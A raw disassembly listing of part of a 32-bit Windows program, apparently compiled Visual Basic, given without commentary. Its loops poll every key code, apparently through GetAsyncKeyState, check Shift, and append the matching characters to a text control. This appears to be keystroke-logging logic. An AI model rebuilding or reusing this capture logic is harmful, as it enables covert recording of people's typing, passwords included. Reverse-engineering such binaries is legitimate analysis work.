  405d6c:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  405d6f:	89 48 08             	mov    %ecx,0x8(%eax)
  405d72:	8b 55 cc             	mov    -0x34(%ebp),%edx
  405d75:	89 50 0c             	mov    %edx,0xc(%eax)
  405d78:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  405d7b:	8b 08                	mov    (%eax),%ecx
  405d7d:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  405d80:	52                   	push   %edx
  405d81:	ff 51 54             	call   *0x54(%ecx)
  405d84:	db e2                	fnclex
  405d86:	89 45 b0             	mov    %eax,-0x50(%ebp)
  405d89:	83 7d b0 00          	cmpl   $0x0,-0x50(%ebp)
  405d8d:	7d 1a                	jge    0x405da9
  405d8f:	6a 54                	push   $0x54
  405d91:	68 18 30 40 00       	push   $0x403018
  405d96:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  405d99:	50                   	push   %eax
  405d9a:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  405d9d:	51                   	push   %ecx
  405d9e:	ff 15 38 10 40 00    	call   *0x401038
  405da4:	89 45 84             	mov    %eax,-0x7c(%ebp)
  405da7:	eb 07                	jmp    0x405db0
  405da9:	c7 45 84 00 00 00 00 	movl   $0x0,-0x7c(%ebp)
  405db0:	68 28 30 40 00       	push   $0x403028
  405db5:	8b 55 d0             	mov    -0x30(%ebp),%edx
  405db8:	52                   	push   %edx
  405db9:	ff 15 3c 11 40 00    	call   *0x40113c
  405dbf:	50                   	push   %eax
  405dc0:	8d 45 d8             	lea    -0x28(%ebp),%eax
  405dc3:	50                   	push   %eax
  405dc4:	ff 15 50 10 40 00    	call   *0x401050
  405dca:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  405dcd:	51                   	push   %ecx
  405dce:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405dd1:	52                   	push   %edx
  405dd2:	6a 02                	push   $0x2
  405dd4:	ff 15 20 10 40 00    	call   *0x401020
  405dda:	83 c4 0c             	add    $0xc,%esp
  405ddd:	c7 45 fc 0b 00 00 00 	movl   $0xb,-0x4(%ebp)
  405de4:	83 3d b8 a3 40 00 00 	cmpl   $0x0,0x40a3b8
  405deb:	75 19                	jne    0x405e06
  405ded:	68 b8 a3 40 00       	push   $0x40a3b8
  405df2:	68 ac 2e 40 00       	push   $0x402eac
  405df7:	ff 15 e8 10 40 00    	call   *0x4010e8
  405dfd:	c7 45 80 b8 a3 40 00 	movl   $0x40a3b8,-0x80(%ebp)
  405e04:	eb 07                	jmp    0x405e0d
  405e06:	c7 45 80 b8 a3 40 00 	movl   $0x40a3b8,-0x80(%ebp)
  405e0d:	8b 45 80             	mov    -0x80(%ebp),%eax
  405e10:	8b 08                	mov    (%eax),%ecx
  405e12:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  405e15:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405e18:	52                   	push   %edx
  405e19:	8b 45 bc             	mov    -0x44(%ebp),%eax
  405e1c:	8b 08                	mov    (%eax),%ecx
  405e1e:	8b 55 bc             	mov    -0x44(%ebp),%edx
  405e21:	52                   	push   %edx
  405e22:	ff 51 1c             	call   *0x1c(%ecx)
  405e25:	db e2                	fnclex
  405e27:	89 45 b8             	mov    %eax,-0x48(%ebp)
  405e2a:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  405e2e:	7d 1d                	jge    0x405e4d
  405e30:	6a 1c                	push   $0x1c
  405e32:	68 9c 2e 40 00       	push   $0x402e9c
  405e37:	8b 45 bc             	mov    -0x44(%ebp),%eax
  405e3a:	50                   	push   %eax
  405e3b:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  405e3e:	51                   	push   %ecx
  405e3f:	ff 15 38 10 40 00    	call   *0x401038
  405e45:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  405e4b:	eb 0a                	jmp    0x405e57
  405e4d:	c7 85 7c ff ff ff 00 	movl   $0x0,-0x84(%ebp)
  405e54:	00 00 00 
  405e57:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  405e5a:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  405e5d:	c7 45 c8 02 00 00 00 	movl   $0x2,-0x38(%ebp)
  405e64:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  405e6b:	b8 10 00 00 00       	mov    $0x10,%eax
  405e70:	e8 2b b6 ff ff       	call   0x4014a0
  405e75:	8b c4                	mov    %esp,%eax
  405e77:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  405e7a:	89 08                	mov    %ecx,(%eax)
  405e7c:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  405e7f:	89 50 04             	mov    %edx,0x4(%eax)
  405e82:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  405e85:	89 48 08             	mov    %ecx,0x8(%eax)
  405e88:	8b 55 cc             	mov    -0x34(%ebp),%edx
  405e8b:	89 50 0c             	mov    %edx,0xc(%eax)
  405e8e:	68 28 30 40 00       	push   $0x403028
  405e93:	8b 45 dc             	mov    -0x24(%ebp),%eax
  405e96:	50                   	push   %eax
  405e97:	ff 15 3c 11 40 00    	call   *0x40113c
  405e9d:	50                   	push   %eax
  405e9e:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  405ea1:	51                   	push   %ecx
  405ea2:	ff 15 50 10 40 00    	call   *0x401050
  405ea8:	50                   	push   %eax
  405ea9:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  405eac:	8b 02                	mov    (%edx),%eax
  405eae:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  405eb1:	51                   	push   %ecx
  405eb2:	ff 50 58             	call   *0x58(%eax)
  405eb5:	db e2                	fnclex
  405eb7:	89 45 b0             	mov    %eax,-0x50(%ebp)
  405eba:	83 7d b0 00          	cmpl   $0x0,-0x50(%ebp)
  405ebe:	7d 1d                	jge    0x405edd
  405ec0:	6a 58                	push   $0x58
  405ec2:	68 18 30 40 00       	push   $0x403018
  405ec7:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  405eca:	52                   	push   %edx
  405ecb:	8b 45 b0             	mov    -0x50(%ebp),%eax
  405ece:	50                   	push   %eax
  405ecf:	ff 15 38 10 40 00    	call   *0x401038
  405ed5:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  405edb:	eb 0a                	jmp    0x405ee7
  405edd:	c7 85 78 ff ff ff 00 	movl   $0x0,-0x88(%ebp)
  405ee4:	00 00 00 
  405ee7:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405eea:	51                   	push   %ecx
  405eeb:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405eee:	52                   	push   %edx
  405eef:	6a 02                	push   $0x2
  405ef1:	ff 15 20 10 40 00    	call   *0x401020
  405ef7:	83 c4 0c             	add    $0xc,%esp
  405efa:	68 32 5f 40 00       	push   $0x405f32
  405eff:	eb 27                	jmp    0x405f28
  405f01:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405f04:	83 e0 04             	and    $0x4,%eax
  405f07:	85 c0                	test   %eax,%eax
  405f09:	74 09                	je     0x405f14
  405f0b:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405f0e:	ff 15 60 11 40 00    	call   *0x401160
  405f14:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  405f17:	51                   	push   %ecx
  405f18:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405f1b:	52                   	push   %edx
  405f1c:	6a 02                	push   $0x2
  405f1e:	ff 15 20 10 40 00    	call   *0x401020
  405f24:	83 c4 0c             	add    $0xc,%esp
  405f27:	c3                   	ret
  405f28:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405f2b:	ff 15 60 11 40 00    	call   *0x401160
  405f31:	c3                   	ret
  405f32:	8b 45 0c             	mov    0xc(%ebp),%eax
  405f35:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  405f38:	89 08                	mov    %ecx,(%eax)
  405f3a:	33 c0                	xor    %eax,%eax
  405f3c:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  405f3f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405f46:	5f                   	pop    %edi
  405f47:	5e                   	pop    %esi
  405f48:	5b                   	pop    %ebx
  405f49:	8b e5                	mov    %ebp,%esp
  405f4b:	5d                   	pop    %ebp
  405f4c:	c2 08 00             	ret    $0x8
  405f4f:	cc                   	int3
  405f50:	55                   	push   %ebp
  405f51:	8b ec                	mov    %esp,%ebp
  405f53:	83 ec 0c             	sub    $0xc,%esp
  405f56:	68 a6 14 40 00       	push   $0x4014a6
  405f5b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405f61:	50                   	push   %eax
  405f62:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405f69:	81 ec fc 01 00 00    	sub    $0x1fc,%esp
  405f6f:	53                   	push   %ebx
  405f70:	56                   	push   %esi
  405f71:	57                   	push   %edi
  405f72:	89 65 f4             	mov    %esp,-0xc(%ebp)
  405f75:	c7 45 f8 a8 13 40 00 	movl   $0x4013a8,-0x8(%ebp)
  405f7c:	8b 75 08             	mov    0x8(%ebp),%esi
  405f7f:	8b c6                	mov    %esi,%eax
  405f81:	83 e0 01             	and    $0x1,%eax
  405f84:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405f87:	83 e6 fe             	and    $0xfffffffe,%esi
  405f8a:	56                   	push   %esi
  405f8b:	89 75 08             	mov    %esi,0x8(%ebp)
  405f8e:	8b 0e                	mov    (%esi),%ecx
  405f90:	ff 51 04             	call   *0x4(%ecx)
  405f93:	8b 1d 50 10 40 00    	mov    0x401050,%ebx
  405f99:	33 c0                	xor    %eax,%eax
  405f9b:	b9 41 00 00 00       	mov    $0x41,%ecx
  405fa0:	89 45 dc             	mov    %eax,-0x24(%ebp)
  405fa3:	89 45 d8             	mov    %eax,-0x28(%ebp)
  405fa6:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  405fa9:	89 45 d0             	mov    %eax,-0x30(%ebp)
  405fac:	89 45 c0             	mov    %eax,-0x40(%ebp)
  405faf:	89 45 b0             	mov    %eax,-0x50(%ebp)
  405fb2:	89 45 a0             	mov    %eax,-0x60(%ebp)
  405fb5:	89 45 90             	mov    %eax,-0x70(%ebp)
  405fb8:	89 45 80             	mov    %eax,-0x80(%ebp)
  405fbb:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  405fc1:	89 85 60 ff ff ff    	mov    %eax,-0xa0(%ebp)
  405fc7:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  405fcd:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  405fd0:	ba 5a 00 00 00       	mov    $0x5a,%edx
  405fd5:	3b ca                	cmp    %edx,%ecx
  405fd7:	0f 8f 40 02 00 00    	jg     0x40621d
  405fdd:	51                   	push   %ecx
  405fde:	e8 51 cd ff ff       	call   0x402d34
  405fe3:	8b f8                	mov    %eax,%edi
  405fe5:	ff 15 34 10 40 00    	call   *0x401034
  405feb:	6a 10                	push   $0x10
  405fed:	0f bf ff             	movswl %di,%edi
  405ff0:	e8 3f cd ff ff       	call   0x402d34
  405ff5:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
  405ffb:	ff 15 34 10 40 00    	call   *0x401034
  406001:	81 ff 01 80 ff ff    	cmp    $0xffff8001,%edi
  406007:	0f 85 f4 01 00 00    	jne    0x406201
  40600d:	66 81 bd 4c ff ff ff 	cmpw   $0x8000,-0xb4(%ebp)
  406014:	00 80 
  406016:	0f 85 f0 00 00 00    	jne    0x40610c
  40601c:	8b 16                	mov    (%esi),%edx
  40601e:	56                   	push   %esi
  40601f:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  406025:	50                   	push   %eax
  406026:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406029:	50                   	push   %eax
  40602a:	ff d3                	call   *%ebx
  40602c:	8b 0e                	mov    (%esi),%ecx
  40602e:	56                   	push   %esi
  40602f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406035:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  40603b:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40603e:	50                   	push   %eax
  40603f:	52                   	push   %edx
  406040:	ff d3                	call   *%ebx
  406042:	8b f8                	mov    %eax,%edi
  406044:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406047:	51                   	push   %ecx
  406048:	57                   	push   %edi
  406049:	8b 07                	mov    (%edi),%eax
  40604b:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  406051:	85 c0                	test   %eax,%eax
  406053:	db e2                	fnclex
  406055:	7d 12                	jge    0x406069
  406057:	68 a0 00 00 00       	push   $0xa0
  40605c:	68 38 30 40 00       	push   $0x403038
  406061:	57                   	push   %edi
  406062:	50                   	push   %eax
  406063:	ff 15 38 10 40 00    	call   *0x401038
  406069:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40606c:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40606f:	89 45 b8             	mov    %eax,-0x48(%ebp)
  406072:	8d 45 c0             	lea    -0x40(%ebp),%eax
  406075:	52                   	push   %edx
  406076:	50                   	push   %eax
  406077:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40607e:	c7 45 b0 08 00 00 00 	movl   $0x8,-0x50(%ebp)
  406085:	ff 15 c4 10 40 00    	call   *0x4010c4
  40608b:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  406091:	8d 55 b0             	lea    -0x50(%ebp),%edx
  406094:	8d 45 c0             	lea    -0x40(%ebp),%eax
  406097:	52                   	push   %edx
  406098:	8b 39                	mov    (%ecx),%edi
  40609a:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40609d:	50                   	push   %eax
  40609e:	51                   	push   %ecx
  40609f:	ff 15 d0 10 40 00    	call   *0x4010d0
  4060a5:	8d 55 d8             	lea    -0x28(%ebp),%edx
  4060a8:	50                   	push   %eax
  4060a9:	52                   	push   %edx
  4060aa:	ff 15 cc 10 40 00    	call   *0x4010cc
  4060b0:	89 bd c0 fe ff ff    	mov    %edi,-0x140(%ebp)
  4060b6:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4060bc:	50                   	push   %eax
  4060bd:	8b 85 c0 fe ff ff    	mov    -0x140(%ebp),%eax
  4060c3:	57                   	push   %edi
  4060c4:	ff 90 a4 00 00 00    	call   *0xa4(%eax)
  4060ca:	85 c0                	test   %eax,%eax
  4060cc:	db e2                	fnclex
  4060ce:	7d 12                	jge    0x4060e2
  4060d0:	68 a4 00 00 00       	push   $0xa4
  4060d5:	68 38 30 40 00       	push   $0x403038
  4060da:	57                   	push   %edi
  4060db:	50                   	push   %eax
  4060dc:	ff 15 38 10 40 00    	call   *0x401038
  4060e2:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4060e5:	ff 15 64 11 40 00    	call   *0x401164
  4060eb:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4060ee:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4060f1:	51                   	push   %ecx
  4060f2:	52                   	push   %edx
  4060f3:	6a 02                	push   $0x2
  4060f5:	ff 15 20 10 40 00    	call   *0x401020
  4060fb:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4060fe:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  406101:	50                   	push   %eax
  406102:	8d 55 b0             	lea    -0x50(%ebp),%edx
  406105:	51                   	push   %ecx
  406106:	52                   	push   %edx
  406107:	e9 ea 00 00 00       	jmp    0x4061f6
  40610c:	8b 06                	mov    (%esi),%eax
  40610e:	56                   	push   %esi
  40610f:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  406115:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406118:	50                   	push   %eax
  406119:	51                   	push   %ecx
  40611a:	ff d3                	call   *%ebx
  40611c:	8b 16                	mov    (%esi),%edx
  40611e:	56                   	push   %esi
  40611f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406125:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  40612b:	50                   	push   %eax
  40612c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40612f:	50                   	push   %eax
  406130:	ff d3                	call   *%ebx
  406132:	8b f8                	mov    %eax,%edi
  406134:	8d 55 dc             	lea    -0x24(%ebp),%edx
  406137:	52                   	push   %edx
  406138:	57                   	push   %edi
  406139:	8b 0f                	mov    (%edi),%ecx
  40613b:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  406141:	85 c0                	test   %eax,%eax
  406143:	db e2                	fnclex
  406145:	7d 12                	jge    0x406159
  406147:	68 a0 00 00 00       	push   $0xa0
  40614c:	68 38 30 40 00       	push   $0x403038
  406151:	57                   	push   %edi
  406152:	50                   	push   %eax
  406153:	ff 15 38 10 40 00    	call   *0x401038
  406159:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40615c:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40615f:	89 45 b8             	mov    %eax,-0x48(%ebp)
  406162:	8b 45 e8             	mov    -0x18(%ebp),%eax
  406165:	83 c0 20             	add    $0x20,%eax
  406168:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40616f:	0f 80 d2 2e 00 00    	jo     0x409047
  406175:	50                   	push   %eax
  406176:	51                   	push   %ecx
  406177:	c7 45 b0 08 00 00 00 	movl   $0x8,-0x50(%ebp)
  40617e:	ff 15 c4 10 40 00    	call   *0x4010c4
  406184:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  40618a:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40618d:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  406190:	50                   	push   %eax
  406191:	8b 3a                	mov    (%edx),%edi
  406193:	8d 55 a0             	lea    -0x60(%ebp),%edx
  406196:	51                   	push   %ecx
  406197:	52                   	push   %edx
  406198:	ff 15 d0 10 40 00    	call   *0x4010d0
  40619e:	50                   	push   %eax
  40619f:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4061a2:	50                   	push   %eax
  4061a3:	ff 15 cc 10 40 00    	call   *0x4010cc
  4061a9:	8b cf                	mov    %edi,%ecx
  4061ab:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4061b1:	50                   	push   %eax
  4061b2:	57                   	push   %edi
  4061b3:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  4061b9:	85 c0                	test   %eax,%eax
  4061bb:	db e2                	fnclex
  4061bd:	7d 12                	jge    0x4061d1
  4061bf:	68 a4 00 00 00       	push   $0xa4
  4061c4:	68 38 30 40 00       	push   $0x403038
  4061c9:	57                   	push   %edi
  4061ca:	50                   	push   %eax
  4061cb:	ff 15 38 10 40 00    	call   *0x401038
  4061d1:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4061d4:	ff 15 64 11 40 00    	call   *0x401164
  4061da:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4061dd:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4061e0:	52                   	push   %edx
  4061e1:	50                   	push   %eax
  4061e2:	6a 02                	push   $0x2
  4061e4:	ff 15 20 10 40 00    	call   *0x401020
  4061ea:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  4061ed:	8d 55 c0             	lea    -0x40(%ebp),%edx
  4061f0:	51                   	push   %ecx
  4061f1:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4061f4:	52                   	push   %edx
  4061f5:	50                   	push   %eax
  4061f6:	6a 03                	push   $0x3
  4061f8:	ff 15 18 10 40 00    	call   *0x401018
  4061fe:	83 c4 1c             	add    $0x1c,%esp
  406201:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  406204:	b8 01 00 00 00       	mov    $0x1,%eax
  406209:	03 c1                	add    %ecx,%eax
  40620b:	0f 80 36 2e 00 00    	jo     0x409047
  406211:	89 45 e8             	mov    %eax,-0x18(%ebp)
  406214:	8b c8                	mov    %eax,%ecx
  406216:	33 c0                	xor    %eax,%eax
  406218:	e9 b3 fd ff ff       	jmp    0x405fd0
  40621d:	b9 08 00 00 00       	mov    $0x8,%ecx
  406222:	c7 85 30 ff ff ff 01 	movl   $0x1,-0xd0(%ebp)
  406229:	00 00 00 
  40622c:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  40622f:	ba de 00 00 00       	mov    $0xde,%edx
  406234:	3b ca                	cmp    %edx,%ecx
  406236:	0f 8f a9 2b 00 00    	jg     0x408de5
  40623c:	83 f9 41             	cmp    $0x41,%ecx
  40623f:	75 07                	jne    0x406248
  406241:	c7 45 e8 5b 00 00 00 	movl   $0x5b,-0x18(%ebp)
  406248:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40624b:	51                   	push   %ecx
  40624c:	e8 e3 ca ff ff       	call   0x402d34
  406251:	8b f8                	mov    %eax,%edi
  406253:	ff 15 34 10 40 00    	call   *0x401034
  406259:	0f bf d7             	movswl %di,%edx
  40625c:	6a 10                	push   $0x10
  40625e:	89 55 e0             	mov    %edx,-0x20(%ebp)
  406261:	e8 ce ca ff ff       	call   0x402d34
  406266:	8b f8                	mov    %eax,%edi
  406268:	ff 15 34 10 40 00    	call   *0x401034
  40626e:	81 7d e0 01 80 ff ff 	cmpl   $0xffff8001,-0x20(%ebp)
  406275:	0f bf ff             	movswl %di,%edi
  406278:	0f 85 4a 2b 00 00    	jne    0x408dc8
  40627e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  406281:	83 c0 f8             	add    $0xfffffff8,%eax
  406284:	3d d6 00 00 00       	cmp    $0xd6,%eax
  406289:	0f 87 39 2b 00 00    	ja     0x408dc8
  40628f:	33 c9                	xor    %ecx,%ecx
  406291:	8a 88 70 8f 40 00    	mov    0x408f70(%eax),%cl
  406297:	ff 24 8d 50 8e 40 00 	jmp    *0x408e50(,%ecx,4)
  40629e:	8b 16                	mov    (%esi),%edx
  4062a0:	56                   	push   %esi
  4062a1:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  4062a7:	50                   	push   %eax
  4062a8:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4062ab:	50                   	push   %eax
  4062ac:	ff d3                	call   *%ebx
  4062ae:	8b 0e                	mov    (%esi),%ecx
  4062b0:	56                   	push   %esi
  4062b1:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4062b7:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  4062bd:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4062c0:	50                   	push   %eax
  4062c1:	52                   	push   %edx
  4062c2:	ff d3                	call   *%ebx
  4062c4:	8b f8                	mov    %eax,%edi
  4062c6:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4062c9:	51                   	push   %ecx
  4062ca:	57                   	push   %edi
  4062cb:	8b 07                	mov    (%edi),%eax
  4062cd:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4062d3:	85 c0                	test   %eax,%eax
  4062d5:	db e2                	fnclex
  4062d7:	7d 12                	jge    0x4062eb
  4062d9:	68 a0 00 00 00       	push   $0xa0
  4062de:	68 38 30 40 00       	push   $0x403038
  4062e3:	57                   	push   %edi
  4062e4:	50                   	push   %eax
  4062e5:	ff 15 38 10 40 00    	call   *0x401038
  4062eb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4062ee:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4062f4:	50                   	push   %eax
  4062f5:	68 00 32 40 00       	push   $0x403200
  4062fa:	8b 3a                	mov    (%edx),%edi
  4062fc:	ff 15 28 10 40 00    	call   *0x401028
  406302:	8b d0                	mov    %eax,%edx
  406304:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406307:	ff 15 38 11 40 00    	call   *0x401138
  40630d:	8b cf                	mov    %edi,%ecx
  40630f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406315:	50                   	push   %eax
  406316:	57                   	push   %edi
  406317:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  40631d:	85 c0                	test   %eax,%eax
  40631f:	db e2                	fnclex
  406321:	7d 12                	jge    0x406335
  406323:	68 a4 00 00 00       	push   $0xa4
  406328:	68 38 30 40 00       	push   $0x403038
  40632d:	57                   	push   %edi
  40632e:	50                   	push   %eax
  40632f:	ff 15 38 10 40 00    	call   *0x401038
  406335:	8d 55 d8             	lea    -0x28(%ebp),%edx
  406338:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40633b:	52                   	push   %edx
  40633c:	50                   	push   %eax
  40633d:	6a 02                	push   $0x2
  40633f:	ff 15 08 11 40 00    	call   *0x401108
  406345:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406348:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40634b:	51                   	push   %ecx
  40634c:	52                   	push   %edx
  40634d:	6a 02                	push   $0x2
  40634f:	ff 15 20 10 40 00    	call   *0x401020
  406355:	8b 06                	mov    (%esi),%eax
  406357:	83 c4 18             	add    $0x18,%esp
  40635a:	56                   	push   %esi
  40635b:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  406361:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406364:	50                   	push   %eax
  406365:	51                   	push   %ecx
  406366:	ff d3                	call   *%ebx
  406368:	8b 16                	mov    (%esi),%edx
  40636a:	56                   	push   %esi
  40636b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406371:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  406377:	50                   	push   %eax
  406378:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40637b:	50                   	push   %eax
  40637c:	ff d3                	call   *%ebx
  40637e:	8b f8                	mov    %eax,%edi
  406380:	8d 55 dc             	lea    -0x24(%ebp),%edx
  406383:	52                   	push   %edx
  406384:	57                   	push   %edi
  406385:	8b 0f                	mov    (%edi),%ecx
  406387:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40638d:	85 c0                	test   %eax,%eax
  40638f:	db e2                	fnclex
  406391:	7d 12                	jge    0x4063a5
  406393:	68 a0 00 00 00       	push   $0xa0
  406398:	68 38 30 40 00       	push   $0x403038
  40639d:	57                   	push   %edi
  40639e:	50                   	push   %eax
  40639f:	ff 15 38 10 40 00    	call   *0x401038
  4063a5:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4063a8:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4063ae:	51                   	push   %ecx
  4063af:	68 88 2f 40 00       	push   $0x402f88
  4063b4:	8b 38                	mov    (%eax),%edi
  4063b6:	ff 15 28 10 40 00    	call   *0x401028
  4063bc:	8b d0                	mov    %eax,%edx
  4063be:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4063c1:	ff 15 38 11 40 00    	call   *0x401138
  4063c7:	8b d7                	mov    %edi,%edx
  4063c9:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4063cf:	50                   	push   %eax
  4063d0:	57                   	push   %edi
  4063d1:	ff 92 a4 00 00 00    	call   *0xa4(%edx)
  4063d7:	85 c0                	test   %eax,%eax
  4063d9:	db e2                	fnclex
  4063db:	0f 8d 52 28 00 00    	jge    0x408c33
  4063e1:	e9 3b 28 00 00       	jmp    0x408c21
  4063e6:	8b 0e                	mov    (%esi),%ecx
  4063e8:	56                   	push   %esi
  4063e9:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  4063ef:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4063f2:	50                   	push   %eax
  4063f3:	52                   	push   %edx
  4063f4:	ff d3                	call   *%ebx
  4063f6:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4063fc:	8b 06                	mov    (%esi),%eax
  4063fe:	56                   	push   %esi
  4063ff:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  406405:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  406408:	50                   	push   %eax
  406409:	51                   	push   %ecx
  40640a:	ff d3                	call   *%ebx
  40640c:	8b f8                	mov    %eax,%edi
  40640e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406411:	50                   	push   %eax
  406412:	57                   	push   %edi
  406413:	8b 17                	mov    (%edi),%edx
  406415:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  40641b:	85 c0                	test   %eax,%eax
  40641d:	db e2                	fnclex
  40641f:	7d 12                	jge    0x406433
  406421:	68 a0 00 00 00       	push   $0xa0
  406426:	68 38 30 40 00       	push   $0x403038
  40642b:	57                   	push   %edi
  40642c:	50                   	push   %eax
  40642d:	ff 15 38 10 40 00    	call   *0x401038
  406433:	8b 55 dc             	mov    -0x24(%ebp),%edx
  406436:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  40643c:	52                   	push   %edx
  40643d:	68 18 32 40 00       	push   $0x403218
  406442:	8b 39                	mov    (%ecx),%edi
  406444:	ff 15 28 10 40 00    	call   *0x401028
  40644a:	8b d0                	mov    %eax,%edx
  40644c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40644f:	ff 15 38 11 40 00    	call   *0x401138
  406455:	89 bd b0 fe ff ff    	mov    %edi,-0x150(%ebp)
  40645b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406461:	50                   	push   %eax
  406462:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  406468:	57                   	push   %edi
  406469:	ff 90 a4 00 00 00    	call   *0xa4(%eax)
  40646f:	85 c0                	test   %eax,%eax
  406471:	db e2                	fnclex
  406473:	0f 8d 78 28 00 00    	jge    0x408cf1
  406479:	e9 61 28 00 00       	jmp    0x408cdf
  40647e:	8b 16                	mov    (%esi),%edx
  406480:	56                   	push   %esi
